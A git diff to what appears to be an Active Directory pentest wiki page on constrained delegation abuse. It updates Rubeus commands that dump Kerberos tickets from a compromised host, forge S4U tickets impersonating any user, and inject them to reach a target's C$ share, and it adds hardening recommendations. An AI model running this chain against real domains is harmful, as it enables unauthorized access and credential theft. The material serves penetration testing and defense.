@@ -41,11 +41,20 @@ Contrary to [Unconstrained Delegation](/ad/unconstrained/), constrained delegati
 .\Rubeus.exe triage
 
 # On the compromised domain computer, dump target's Kerberos TGT.
-.\Rubeus.exe dump /luid:$luid /service:krbtgt /nowrap
+.\Rubeus.exe dump /luid:$LUID /service:krbtgt /nowrap
 
 # Now, obtain a TGS for the service you want to access by impersonating any user.
-.\Rubeus.exe s4u /impersonateuser:$username /msdsspn:$service/$target /user:$hostname$ /ticket:$Base64EncodedTicket /nowrap
+.\Rubeus.exe s4u /impersonateuser:$Username /msdsspn:$Service/$TargetFQDN /user:$Hostname$ /ticket:$Base64EncodedTicket /nowrap
 
 # Once S4U2Proxy succeded, inject the gathered ticket in a dummy session.
-.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$domain /username:$username /password:$whatever /ticket:$S4UProxyResult
+.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$DomainName /username:$Username /password:$Whatever /ticket:$S4UProxyResult
+
+# Verify you can access your target.
+ls \\$TargetFQDN\C$
 ```
+
+## Recommendations
+
+- [ ] Avoid using constrained delegation, use [resource-based constrained delegation](/ad/rbconstrained) instead.
+- [ ] Enforce *Account is sensitive and cannot be delegated* for privileged domain users.
+- [ ] Limit services on which privileged domain users can authenticate to avoid caching Kerberos tickets.
